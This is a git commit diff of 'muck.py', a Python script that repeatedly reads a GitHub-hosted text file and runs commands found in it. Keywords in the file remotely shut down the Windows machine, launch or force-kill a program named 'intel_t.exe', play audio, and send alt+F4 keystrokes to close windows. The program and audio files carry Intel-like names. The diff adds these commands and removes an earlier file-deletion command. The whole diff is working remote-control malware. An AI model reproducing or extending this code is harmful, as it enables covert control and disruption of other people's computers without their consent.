e2f2dd5b7ca4a0fef41954dfb48933bccbfbd618
semihcelik8 <81470723+semihcelik8@users.noreply.github.com>
2023-01-16 02:27:53 +0300

    Update muck.py

--- muck.py
+++ muck.py
@@ -1,26 +1,72 @@
 import os
+import keyboard
 from bs4 import BeautifulSoup
 from urllib.request import urlopen
 import re
+from pygame import mixer
+
+global text
+
+run = 0
+runalt = 0
 
 while True:
     url = "https://github.com/semihcelik8/triggered/blob/main/muck.txt"
-    page = urlopen(url)
-    html = page.read().decode("utf-8")
-    soup = BeautifulSoup(html, "html.parser")
-    order = soup.get_text()
-    text = order
+    try:
+        page = urlopen(url)
+        html = page.read().decode("utf-8")
+        soup = BeautifulSoup(html, "html.parser")
+        order = soup.get_text()
+        text = order
+    except:
+        print("something went wrong!")
     x = re.search("shutdown", text)
     y = re.search("matrix", text)
+    c = re.search("close", text)
     z = re.search("rick", text)
-    w = re.search("delete", text)
+    w = re.search("stop", text)
+    a = re.search("alt", text)
+    r = re.search("release", text)
+    e = re.search("exit", text)
 
     if  x:
-        os.system("shutdown /s")
+        try:
+            os.system("shutdown /s")
+        except:
+            print("something went wrong!")
     if y:
-        print("hello")
-        os.system("intel_f.exe")
+        try:
+            os.system("intel_t.exe")
+        except:
+            print("something went wrong!")
+    if c:
+        try:
+            os.system("taskkill /F /IM intel_t.exe")
+        except:
+            print("something went wrong!")
     if z:
-        os.system("intel_sound.mp3")
+        try:
+            if run == 0:
+                mixer.init()
+                mixer.music.load("intel_m.mp3")
+                mixer.music.play()
+                run = 1
+        except:
+            print("something went wrong!")
     if w:
-        os.system("del k.txt")
+        try:
+            mixer.music.stop()
+            run = 0
+        except:
+            print("something went wrong!")
+    if a:
+        try:
+            if runalt == 0:
+                keyboard.send("alt+F4, space")
+                runalt = 1
+        except:
+            print("something went wrong!")
+    if r:
+        runalt = 0
+    if e:
+        exit()
